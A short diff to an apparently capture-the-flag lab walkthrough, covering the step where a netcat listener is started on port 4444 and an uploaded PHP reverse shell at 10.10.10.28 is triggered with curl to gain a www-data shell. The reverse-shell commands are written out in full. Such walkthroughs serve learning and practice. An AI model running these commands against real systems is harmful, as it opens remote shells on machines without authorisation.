@@ -146,8 +146,12 @@ Step 3: finding and using our reverse shell.
 
 Step 4: Calling our Reverse shell.
 
-  - First we want to set up a listner using netcat
+  - First we want to set up a listner using netcat in one terminal
     -     nc -lvnp 4444
-  - Next we want to call on our command using the curl command.
+  - In another teminal we want to call on our reverse shell using the curl command.
     -     curl http://10.10.10.28/uploads/php-reverse-shell.php
       - if you nammed your file anything else use the name of the file you uploaded at the end of the path
+  - Once ran we obtain a www-data shell, but we still have to upgrade it!
+    ![image](https://user-images.githubusercontent.com/29686845/133340021-920411b8-e932-47c8-9598-b0dab56c3cb8.png)
+  - 
+
